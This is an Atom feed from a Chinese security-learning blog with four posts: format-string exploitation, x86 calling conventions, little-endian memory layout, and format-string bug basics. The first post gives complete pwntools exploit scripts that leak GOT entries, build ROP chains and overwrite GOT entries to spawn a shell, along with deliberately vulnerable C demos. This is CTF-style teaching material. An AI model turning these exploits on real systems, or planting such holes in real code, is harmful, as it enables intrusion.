<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Hexo</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2019-02-20T14:43:42.112Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>John Doe</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>格式化串漏洞利用总结</title>
    <link href="http://yoursite.com/2019/02/12/%E6%A0%BC%E5%BC%8F%E5%8C%96%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/"/>
    <id>http://yoursite.com/2019/02/12/格式化串漏洞利用总结/</id>
    <published>2019-02-12T11:43:21.000Z</published>
    <updated>2019-02-20T14:43:42.112Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h3><p>这篇笔记总结下格式化字符串漏洞的利用。看之前需要对基本格式化字符串漏洞原理有所了解，在先前的笔记中已有。<br>格式化字符串漏洞的利用，往往就两点：泄露内存，修改内存。泄露内存可以泄露栈上数据，如 saved ebp/rbp , 返回地址，还有函数的got表项内容。修改内存可以修改got表项内容，返回地址，变量的值等等。还可以利用他来写ROP等。</p><h3 id="预备知识："><a href="#预备知识：" class="headerlink" title="预备知识："></a>预备知识：</h3><ol><li>%x:   他可以将对应参数的值以16进制打印出来，<strong>%x只能打印4个字节，%lx或者%llx可以打8个字节</strong>。如%x表示要泄漏对应偏移4字节长度的16进制数据，%llx表示要泄漏对应偏移8字节长度的16进制数据。</li><li>%s：可以打印<strong>对应参数所指向的字符串</strong>。</li><li>%n:  可以修改对应参数（这个参数是指针）所指向的变量的值为%n之前打印的字符的个数，如果是32位程序，则这个指针变量为4字节，64位程序这个指针变量为8字节，这是因为不同位数，地址的长度不同。<strong>还要注意%n是修改对应参数指向的地址起，4字节长度的空间。，%hn，是修改2字节的地址空间，%hhn是1字节的地址空间，%lln是修改8字节的地址空间。</strong><br><strong>像修改地址这样的大数据，如果一次输出太多的字节可能会引起程序崩溃，则可以利用%hn，%hhn来一部分一部分的写入，下面修改内存部分会讲到。</strong></li></ol><h3 id="泄露内存："><a href="#泄露内存：" class="headerlink" title="泄露内存："></a>泄露内存：</h3><h4 id="泄露got表项内容："><a href="#泄露got表项内容：" class="headerlink" title="泄露got表项内容："></a>泄露got表项内容：</h4><p>   泄露内存可以泄露程序中使用过的函数的got表项的内容，得到该函数的地址。但是在64位程序中，往往会被\x00给截断。。因为64位程序中，很多地址的高位是00，但是在32位程序中不会，这就需要将地址写在格式化串的末尾。<br>   如果已知目标程序使用的libc库，就可以计算出system函数的地址，<br>   如果题目没有给出目标程序使用的libc库，则可以多泄露几个函数的地址，通过 <a href="http://libcdb.com/" target="_blank" rel="noopener">http://libcdb.com/</a> 来获知目标程序使用的libc库，然后再计算出system函数的地址。也可以使用这个python的库<a href="https://github.com/lieanu/LibcSearcher" target="_blank" rel="noopener">https://github.com/lieanu/LibcSearcher</a> 来获知目标程序使用的动态库，原理都是一样的：ASLR不会随机化地址的后12bit。<br>具体计算方法是:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">libc_base = 泄露函数的地址 - 其在libc库中的偏移(libc.symbols[&quot;函数名&quot;])</span><br><span class="line">system_address = libc_base + system在库中的偏移(libc.symbols[&quot;system&quot;])</span><br></pre></td></tr></table></figure></p><p> 出现格式化串漏洞的时候，程序往往是这样的：</p><pre><code>char a[50];read(0,a,50);printf(a);</code></pre><p>则你输入的字符串是保存在栈中的（后面会讨论格式化串不在栈中的情况，如在bss段或者堆中），然后你调用printf函数，此时printf函数的堆栈是在原先函数堆栈的低地址处，所以printf可以找到字符串的空间。<br>如图：<br><img src="/2019/02/12/格式化串漏洞利用总结/1.png" alt=""><br>例如可以得到这样的结果：<br><img src="/2019/02/12/格式化串漏洞利用总结/2.png" alt=""><br>这样就可以将你输入的字符串当做地址来打印地址对应的内容。写个例子，分别讨论下32位和64位。</p><h5 id="32位程序："><a href="#32位程序：" class="headerlink" title="32位程序："></a>32位程序：</h5><p> 源代码如下：<br> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"> #include&lt;stdio.h&gt;</span><br><span class="line">#include&lt;stdlib.h&gt;</span><br><span class="line">#include&lt;string.h&gt;</span><br><span class="line">void fsb()</span><br><span class="line">&#123;</span><br><span class="line">  setbuf(stdout,0);</span><br><span class="line">  setbuf(stdin,0);</span><br><span class="line">  char a[100];</span><br><span class="line">  read(0,a,100);</span><br><span class="line">  printf(a);</span><br><span class="line">  memset(a,0,sizeof(a));</span><br><span class="line">  read(0,a,0x500);</span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">  fsb();</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>编译时关闭了canary和pie保护：<br> <code>gcc -m32 demo.c -fno-stack-protector -no-pie -g -o demo</code><br> 这里的setbuf函数是关闭输出缓冲区，防止远程打的时候，没有输出。<br> 题目的思路如下：<br> 使用格式化串漏洞随便泄露一个函数的got表项内容，结合libc库，计算出libc的基地址，接着计算出system函数的地址。<br> 此时格式化串的构造方式为：<br> <code>payload=函数got表项的地址+ %offset$s</code><br> 这样就可以将got表项的内容打印出来，计算出system函数的地址后，简单的rop，即可得到shell，完整exp如下：<br> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line">#coding=utf-8</span><br><span class="line">from pwn import *</span><br><span class="line">a=process(&quot;./demo&quot;)</span><br><span class="line">elf=ELF(&quot;./demo&quot;)</span><br><span class="line">libc=ELF(&quot;./libc.so.6&quot;)</span><br><span class="line">offset=7</span><br><span class="line"></span><br><span class="line">read_got=elf.got[&quot;read&quot;]</span><br><span class="line">payload=p32(read_got)+&quot;%7$s&quot; #格式化串</span><br><span class="line">a.send(payload)</span><br><span class="line">read_addr=u32(a.recv(8)[4:8]) #接受read函数的地址</span><br><span class="line"></span><br><span class="line">system_addr=read_addr-libc.symbols[&quot;read&quot;]+libc.symbols[&quot;system&quot;]</span><br><span class="line">pop3ret = 0x8048619 </span><br><span class="line">payload=&apos;A&apos;*112 #padding</span><br><span class="line">payload+=p32(read_addr) #read函数将/bin/sh读入bss段</span><br><span class="line">payload+=p32(pop3ret)</span><br><span class="line">payload+=p32(0)</span><br><span class="line">payload+=p32(elf.bss())</span><br><span class="line">payload+=p32(10)</span><br><span class="line">payload+=p32(system_addr)</span><br><span class="line">payload+=p32(pop3ret)</span><br><span class="line">payload+=p32(elf.bss())</span><br><span class="line"></span><br><span class="line">a.sendline(payload)</span><br><span class="line">sleep(0.1)</span><br><span class="line">a.sendline(&quot;/bin/sh\x00&quot;)</span><br><span class="line">a.interactive()</span><br></pre></td></tr></table></figure></p><p><img src="/2019/02/12/格式化串漏洞利用总结/3.png" alt=""></p><h5 id="64位程序："><a href="#64位程序：" class="headerlink" title="64位程序："></a>64位程序：</h5><p>和32位程序的代码是一样的。编译时去掉了-m32选项。</p><p>64位参数的传递和32位有所不同，由于64位cpu寄存器很多，所以前6个参数通过寄存器传递，从函数名开始的第一个参数到第六个参数依次放在rdi,rsi,rdx,rcx,r8,r9，多余6个的参数，从右往左依次入栈。<br>由于64位程序的地址，很多高位是0，这样就会导致，格式化串被\x00截断,例如：<br><img src="/2019/02/12/格式化串漏洞利用总结/4.png" alt=""><br>拿read函数的got举例：<br><code>p64(read_got)=&quot;\x30\x10\x60\x00\x00\x00\x00\x00&quot;</code><br>由于字符串是以\x00结尾的，所以会被截断，但是将其放在字符串的末尾就可以解决了：<br><code>payload=&#39;%&#39;+str(offset+???)+&quot;$s&quot;+p64(read_got)</code><br>要注意将地址写在8字节对齐处。<br>完整的脚本如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line">#coding=utf-8</span><br><span class="line">from pwn import *</span><br><span class="line">#context.log_level=&quot;debug&quot;</span><br><span class="line">a=process(&quot;./demo64&quot;)</span><br><span class="line">elf=ELF(&quot;./demo64&quot;)</span><br><span class="line">libc=ELF(&quot;./libc.so.6&quot;)</span><br><span class="line">offset=6</span><br><span class="line"></span><br><span class="line">read_got=elf.got[&quot;read&quot;]</span><br><span class="line">payload=&quot;AAAA%7$s&quot;+p64(read_got)</span><br><span class="line">a.sendline(payload)</span><br><span class="line">read_addr=u64(a.recvuntil(&quot;\x30&quot;,drop=True)[4:].ljust(8,&apos;\x00&apos;))</span><br><span class="line">print &quot;read_addr = &quot;+str(hex(read_addr))</span><br><span class="line"></span><br><span class="line">system_addr=read_addr-libc.symbols[&quot;read&quot;]+libc.symbols[&quot;system&quot;]</span><br><span class="line">print &quot;system_addr = &quot;+str(hex(system_addr))</span><br><span class="line">pop_rdi_ret=0x400753 #ROPgadget</span><br><span class="line"></span><br><span class="line">#ret2csu </span><br><span class="line">payload=&apos;A&apos;*120 #padding</span><br><span class="line">payload+=p64(0x40074A)#csu_init </span><br><span class="line">payload+=p64(0)#rbx=0</span><br><span class="line">payload+=p64(1)#rbp=1</span><br><span class="line">payload+=p64(read_got)#r12 </span><br><span class="line">payload+=p64(0)#arg3 -&gt; length</span><br><span class="line">payload+=p64(elf.bss())#arg2 -&gt; buf</span><br><span class="line">payload+=p64(7)#arg1 -&gt; fd</span><br><span class="line">payload+=p64(0x400730)</span><br><span class="line">payload+=&apos;A&apos;*56 #padding</span><br><span class="line">payload+=p64(pop_rdi_ret)#return address</span><br><span class="line">payload+=p64(elf.bss())</span><br><span class="line">payload+=p64(system_addr)</span><br><span class="line">a.sendline(payload)</span><br><span class="line">sleep(0.1)</span><br><span class="line">a.send(&quot;/bin/sh\x00&quot;)</span><br><span class="line">a.interactive()</span><br></pre></td></tr></table></figure></p><p><img src="/2019/02/12/格式化串漏洞利用总结/5.png" alt=""></p><h3 id="修改内存："><a href="#修改内存：" class="headerlink" title="修改内存："></a>修改内存：</h3><p>   修改内存往往是修改函数的GOT表项，例如修改为system函数的地址，则调用被修改got表的函数就会调用system函数。结合下面的小例子来看一下：</p><pre><code>#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;int main(){  setbuf(stdout,0);  while(1)  {    char b[100];    gets(b);    printf(b);  }  return 0;}</code></pre><p>   编译时关闭了canary保护和PIE保护。<br>   这个例子的利用思路就是先使用printf函数泄露某个函数的地址，然后结合libc库，计算出system函数的地址。第二次利用printf函数修改printf函数的got表项内容为system函数的地址，再输入字符串/bin/sh\x00，则再次调用printf函数时，其实会调用system(“/bin/sh”)，这样就可以拿到shell了。下面分32位程序和64位程序：</p><h5 id="32位程序：-1"><a href="#32位程序：-1" class="headerlink" title="32位程序："></a>32位程序：</h5><p>   32位程序不会有被地址截断的情况，则格式化串比较好写。<br>   可以一个字节一个字节写，这样打印的字符就会很少，不至于程序崩溃，当然也可以两个字节两个字节写入，一个字节写入的模板如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload=p32(target)+p32(target+1)+p32(target+2)+p32(target+3)</span><br><span class="line">payload+=&apos;%&apos;+str(length1)+&apos;c&apos;+&quot;%&quot;+str(offset)+&quot;$hhn&quot;</span><br><span class="line">payload+=&apos;%&apos;+str(length2)+&apos;c&apos;+&quot;%&quot;+str(offset+1)+&quot;$hhn&quot;</span><br><span class="line">payload+=&apos;%&apos;+str(length3)+&apos;c&apos;+&quot;%&quot;+str(offset+2)+&quot;$hhn&quot;</span><br><span class="line">payload+=&apos;%&apos;+str(length4)+&apos;c&apos;+&quot;%&quot;+str(offset+3)+&quot;$hhn&quot;</span><br></pre></td></tr></table></figure></p><p>pwntools这个库有了现成的函数fmtstr_payload，可以生成修改内存的格式化串,但是这个只适用于32位的，原因是这个函数生成的payload和上面写的模板是一样的，64位的程序，地址会有00，这个payload会被截断。<br>   完整的利用脚本如下：</p><pre><code>#!/usr/bin/env pythonfrom pwn import *context.log_level=&quot;debug&quot;a=process(&quot;./fsb&quot;)elf=ELF(&quot;./fsb&quot;)libc=ELF(&quot;./libc.so.6&quot;)printf_got=elf.got[&quot;printf&quot;]def leak(addr):    payload=p32(addr)    payload+=&quot;%7$s&quot;    a.sendline(payload)    data=a.recv(8)[4:8]    return datadef get(target,printed):    if printed&gt;target:        return (256-printed+target)    elif printed==target:        return 0    else:         return target-printeddef modify(target,offset,old):    t1=target&amp;0xff    t2=target&gt;&gt;8&amp;0xff    t3=target&gt;&gt;16&amp;0xff    t4=target&gt;&gt;24&amp;0xff    payload=p32(old)+p32(old+1)+p32(old+2)+p32(old+3)    len1=get(t1,len(payload))    len2=get(t2,(len1)+16)    len3=get(t3,(len2+len1)+16)    len4=get(t4,(len3+len2+len1)+16)    payload+=&apos;%&apos;+str(len1)+&apos;c&apos;+&apos;%&apos;+str(offset)+&apos;$hhn&apos;    payload+=&apos;%&apos;+str(len2)+&apos;c&apos;+&apos;%&apos;+str(offset+1)+&apos;$hhn&apos;    payload+=&apos;%&apos;+str(len3)+&apos;c&apos;+&apos;%&apos;+str(offset+2)+&apos;$hhn&apos;    payload+=&apos;%&apos;+str(len4)+&apos;c&apos;+&apos;%&apos;+str(offset+3)+&apos;$hhn&apos;    return payloadprintf_addr=u32(leak(printf_got))system_addr=printf_addr-libc.symbols[&quot;printf&quot;]+libc.symbols[&quot;system&quot;]payload=modify(system_addr,7,printf_got)a.sendline(payload) sleep(0.1)a.sendline(&quot;/bin/sh\x00&quot;)a.interactive()</code></pre><p>一点一点解释脚本：</p><pre><code>payload=p32(old)+p32(old+1)+p32(old+2)+p32(old+3)</code></pre><p>这里是先将要修改的got表项的地址写入栈中，然后利用找到的偏移来一个字节一个字节的修改</p><pre><code>def get(target,printed):        if printed&gt;target:            return (256-printed+target)        elif printed==target:            return 0        else:             return target-printed</code></pre><p>get函数是用来计算要打印多少字节的。如果前面覆盖字节所需打印的字符的个数超过了后面要打印字节的个数，则可以通过溢出来调整，例如你想要写入\x00，则你可以打印0x100个字符，因为只能写入一个字节长度，所以高位字节会被截断，只留下\x00。</p><h5 id="64位程序：-1"><a href="#64位程序：-1" class="headerlink" title="64位程序："></a>64位程序：</h5><p>64位程序用这道题做示范：ASIS CTF 2017 Mary Morton</p><p>网上的writeup都是使用现成的工具formatStringExploiter来攻击的。<br>还有的writeup是通过泄露canary，利用栈溢出写rop利用的。这次通过手动利用格式化串漏洞来攻击。<br>64位程序，修改内存，就不能像上面32位那样，分开一点一点写了，只能利用%lln一次写完。当然，如果目标内存，只需要修改2个字节或者4字节，就可以使用%hn，%n。<br>格式化串的目标如下：<br><code>payload=&#39;a&#39;*(???)+&#39;%&#39;+str(length)+&#39;c&#39;+&#39;%&#39;+str(offset+????)+&quot;$lln&quot;+p64(目标地址)</code><br>payload前面的 ‘a’ 是考虑到字节对齐的问题，要将目标地址写在8字节对齐处。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;前言：&quot;&gt;&lt;a href=&quot;#前言：&quot; class=&quot;headerlink&quot; title=&quot;前言：&quot;&gt;&lt;/a&gt;前言：&lt;/h3&gt;&lt;p&gt;这篇笔记总结下格式化字符串漏洞的利用。看之前需要对基本格式化字符串漏洞原理有所了解，在先前的笔记中已有。&lt;br&gt;格式化字符串漏洞的利
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>x86汇编 函数调用</title>
    <link href="http://yoursite.com/2019/02/11/x86%E6%B1%87%E7%BC%96-%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8/"/>
    <id>http://yoursite.com/2019/02/11/x86汇编-函数调用/</id>
    <published>2019-02-11T09:05:59.000Z</published>
    <updated>2019-02-11T09:12:13.127Z</updated>
    
    <content type="html"><![CDATA[<p>函数调用一般有个模板。</p><pre><code>push ebpmov ebp,esp//这里提升堆栈sub esp,0x40  //这里是开辟缓冲区，不同编译器开辟的缓冲区大小不同。push edipush esipush ebx//保留现场lea edi, dword ptr ss:[ebp-0x40]mov ecx,0x10mov eax,0xccccccccrep stos dowrd ptr es:[edi]//填充缓冲区----------------这里是写函数的功能----------------    pop ebx    pop esi    pop edi    //恢复现场    mov esp,ebp    pop ebp    ret</code></pre><p>执行完上面代码，堆栈图差不多就是这个样子，（该图，下面是高址，上面是低址）<br>中间的ccc….就是填充缓冲区。填充后可以用来写入局部变量。<br>EBP后面的高址，存有恢复用的EIP，和call函数前push的参数。<br>EBP前面的低址，用来存局部变量。</p><p><img src="/2019/02/11/x86汇编-函数调用/1.png" alt=""></p><hr><p>根据函数调用约定的不同，平衡堆栈的方式不同<br>如果是__cedcl约定，是在母函数中平衡堆栈，就是函数调用完返回后，在调用者的函数体内 add esp，xx 来平衡堆栈。<br>例如母函数体内：<br> <code>push xx call 子函数 add esp,0x4</code></p><p>有几种函数调用约定，不同的调用约定，参数的传递，堆栈的平衡方式不同。下面是三种常见的调用约定：<br><strong>__cedcl 约定</strong><br>参数从右往左，依次入栈。堆栈平衡在母函数中完成。<br>在函数调用前，将参数压栈。<br><code>push xxxpush xxx...然后call 函数。//函数执行完毕add esp ，xx//在母函数中平衡堆栈</code></p><p><strong>stdcall 约定</strong><br>参数从右往左依次入栈，在子函数中 平衡堆栈。<br>参数还是在调用前push 入栈。<br>平衡堆栈时，在 子函数 ret 后加个 xx  恢复堆栈<br>例如 ret   0x8，相当于 pop eip     add esp，0x8 </p><p><strong>fastcall 约定</strong><br>参数从右往左依次入栈，在子函数中 平衡堆栈<br>参数1个或者两个用 寄存器 传参，多于两个，多余两个的部分还是压栈传参。<br>例如  func(int a,int b,int c)<br><code>push cmov eax,bmov ecx,a</code><br>然后再call 函数，最后在子函数中平衡堆栈。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;函数调用一般有个模板。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;push ebp
mov ebp,esp
//这里提升堆栈
sub esp,0x40  
//这里是开辟缓冲区，不同编译器开辟的缓冲区大小不同。
push edi
push esi
push ebx
//保留现场
lea
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>深入理解little-endian</title>
    <link href="http://yoursite.com/2019/02/11/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3little-endian/"/>
    <id>http://yoursite.com/2019/02/11/深入理解little-endian/</id>
    <published>2019-02-11T08:59:32.000Z</published>
    <updated>2019-02-11T09:02:28.476Z</updated>
    
    <content type="html"><![CDATA[<p>little-endian 简单来说即低位字节排放在内存的低地址端，高位字节排放在内存的高地址端。</p><p>首先，明确一点，最小的单元都是字节；数据在内存中的存放是以字节为单位的。字节内的内容<strong>没有</strong>所谓的高位高址，低位低址。</p><p>在内存中存放数据时，先将这个数据拆分为一个一个的字节。再将高位字节放在高址，低位字节放低址。</p><p>要注意内存数据（数据在内存中实际位置）和 数值数据（实际应用的数值）的区别。真实内存中数据的存放是高位放高址，低位放低址。 而变为数值数据时是从高位到低位连起来的，例如 原本数据是int a=0x12345678，而实际放在内存中是  78 56 34 12 ，将其作为数值应用时，要将高位从低位连起来。更直观点是这样的。</p><p><img src="/2019/02/11/深入理解little-endian/1.png" alt=""></p><p>再来看看数值数据是如何转变的。</p><p><img src="/2019/02/11/深入理解little-endian/2.png" alt=""></p><p>内存中真实存储情况是这样的，但是应用为数据时（即这一格代表的数是多少）要从高址到低址读，即EBP-4这一格代表的数据是12345678。<br>在一些调试器上，例如ollydbg中，显示一格对应的数据时，一般已经转化为应用数据了（例如OD的堆栈窗口），而不是内存中的真实存储情况，这一点要清楚。</p><p>还需要清楚知道的是little-endian的存放机制的对象是<strong>单个元素的数值在内存的存放</strong>。 <em>对数组的元素的存放需要区别。</em></p><p><strong>数组的寻址公式是 ：首元素的地址+ n * 数组单个元素所占字节数。</strong>所以数组的存放是高位的<strong>元素</strong>在低址，低位的<strong>元素</strong>在高址。这里要和单个元素的存放区别开。<br>例如 char a[5]=”abcde”;<br>则元素在内存中的存储是</p><p><img src="/2019/02/11/深入理解little-endian/3.png" alt=""></p><p>再例如 int a[3]={0xaabbccdd,0xbbccddee,0xccddeeff};<br>则在内存中存储是</p><p><img src="/2019/02/11/深入理解little-endian/4.png" alt=""></p><p>这两个例子中都是真实存储情况，不是应用数值。<br>后者这个例子中，每个元素的存储方式还是按照little-endian的方式存储。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;little-endian 简单来说即低位字节排放在内存的低地址端，高位字节排放在内存的高地址端。&lt;/p&gt;
&lt;p&gt;首先，明确一点，最小的单元都是字节；数据在内存中的存放是以字节为单位的。字节内的内容&lt;strong&gt;没有&lt;/strong&gt;所谓的高位高址，低位低址。&lt;/p&gt;
&lt;
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>基本格式化字符串漏洞原理</title>
    <link href="http://yoursite.com/2019/02/11/%E5%9F%BA%E6%9C%AC%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/"/>
    <id>http://yoursite.com/2019/02/11/基本格式化字符串漏洞原理/</id>
    <published>2019-02-11T08:42:04.000Z</published>
    <updated>2019-02-11T08:56:22.839Z</updated>
    
    <content type="html"><![CDATA[<p>理解这个漏洞的原理，你需要有汇编层面的函数调用和函数的参数传递知识。如果你不清楚函数的参数是如何传递的，可以看《加密与解密》的逆向分析技术篇。</p><p>再说格式化字符串漏洞之前，先了解一下printf函数和利用该漏洞的重要 格式化字符串%n，利用他可以做到几乎任意内存写入。</p><h3 id="函数原型"><a href="#函数原型" class="headerlink" title="函数原型"></a>函数原型</h3><p>int printf (“格式化字符串”,参量… )<br>函数的返回值是正确输出的字符的个数，如果输出失败，返回负值。<br>参量表中参数的个数是不定的（<em>如何实现参数的个数不定，可以参考《程序员的自我修养》这本书</em>），可以是一个，可以是两个，三个…..，<strong>也可以没有参数</strong>。<br>printf函数的格式化字符串常见的有 %d，%f，%c，%s，%x（输出16进制数，前面没有0x），%p（输出16进制数，前面带有0x）等等。<br>但是有个不常见的格式化字符串 <strong>%n</strong> ，它的功能是将%n之前打印出来的字符个数，赋值给一个变量。</p><p><strong>除了%n,还有%hn，%hhn，%lln，分别为写入目标空间2字节，1字节，8字节。</strong> 注意是指针指向的地方开始起几个字节。不要觉得%lln，取的是8个字节的指针，%n取的就是4个字节的指针，取的是多少字节的指针只跟 程序的位数有关，如果是32位的程序，%n取的就是4字节指针，64位取的就是8字节指针，这是因为不同位数的程序，地址的长度是不同的。</p><p>具体实例：<br><img src="/2019/02/11/基本格式化字符串漏洞原理/1.png" alt=""></p><p>%n之前打印了5个a，所以n的值变成了5。</p><p>了解了这些后就可以说下格式化字符串漏洞了。</p><h3 id="漏洞成因和基本原理"><a href="#漏洞成因和基本原理" class="headerlink" title="漏洞成因和基本原理"></a>漏洞成因和基本原理</h3><p>正确使用printf是这样的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;bits/stdc++.h&gt;</span><br><span class="line">using namespace std;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">  int n=5;</span><br><span class="line">  printf(&quot;%d&quot;,n);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但也有人会懒省事，写成这样：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;bits/stdc++.h&gt;</span><br><span class="line">using namespace std;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">  char a[]=&quot;neuqcsa&quot;;</span><br><span class="line">  printf(a);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实参与函数形参的结合顺序是从左往右依次进行的，所以上面的代码也能输出：</p><p><img src="/2019/02/11/基本格式化字符串漏洞原理/2.png" alt=""></p><p>上面的代码不会有什么问题，但是如果将字符串的输入权交给用户就会有问题了。看下面的代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;bits/stdc++.h&gt;</span><br><span class="line">using namespace std;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">  char a[100];</span><br><span class="line">  scanf(&quot;%s&quot;,a);</span><br><span class="line">  printf(a);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果用户输入的字符串是”%x%x%x”，则会输出以下结果<br><img src="/2019/02/11/基本格式化字符串漏洞原理/3.png" alt=""></p><p>输出的结果是 内存中的数据。</p><p>看一下调用printf函数后的堆栈图：（cdecl调用方式，参数从右往左依次入栈）</p><p><img src="/2019/02/11/基本格式化字符串漏洞原理/4.png" alt=""></p><p>在OD中可以清晰的看到：<br><img src="/2019/02/11/基本格式化字符串漏洞原理/5.png" alt=""></p><p><strong>这是因为printf函数并不知道参数个数，它的内部有个指针，用来索检格式化字符串。对于特定类型%，就去取相应参数的值，直到索检到格式化字符串结束。</strong></p><p>所以尽管没有参数，上面的代码也会将format string 后面的内存当做参数以16进制输出。这样就会造成内存泄露。</p><h3 id="任意内存的读取及任意内存写入："><a href="#任意内存的读取及任意内存写入：" class="headerlink" title="任意内存的读取及任意内存写入："></a>任意内存的读取及任意内存写入：</h3><p> 任意的内存的读取需要用到格式化字符串 <strong>%s</strong>，其对应的参量是一个指向字符串首地址的指针，作用是输出这个字符串。</p><p>在说任意内存的读取之前要知道 <strong>局部变量是存储在栈中</strong>，这点很关键。所以一定可以找到我们所输入的格式化字符串。<br>例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#include&lt;stdlib.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">  char a[100];</span><br><span class="line">  scanf(&quot;%s&quot;,a);</span><br><span class="line">  printf(a);</span><br><span class="line">  system(&quot;pause&quot;);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以得到以下结果<br><img src="/2019/02/11/基本格式化字符串漏洞原理/6.png" alt=""></p><p>看下堆栈图：<br>这是调用scanf函数前的堆栈图。</p><p><img src="/2019/02/11/基本格式化字符串漏洞原理/7.png" alt=""></p><p>输入字符串后的堆栈图：<br><img src="/2019/02/11/基本格式化字符串漏洞原理/8.png" alt=""></p><p>调用printf函数的过程：</p><pre><code>mov eax，数组首地址push eax  call printf</code></pre><p>该过程只是将数组的首地址入栈，此时堆栈图如下。<br><img src="/2019/02/11/基本格式化字符串漏洞原理/9.png" alt=""><br>所以在格式化字符串里用很多的%x 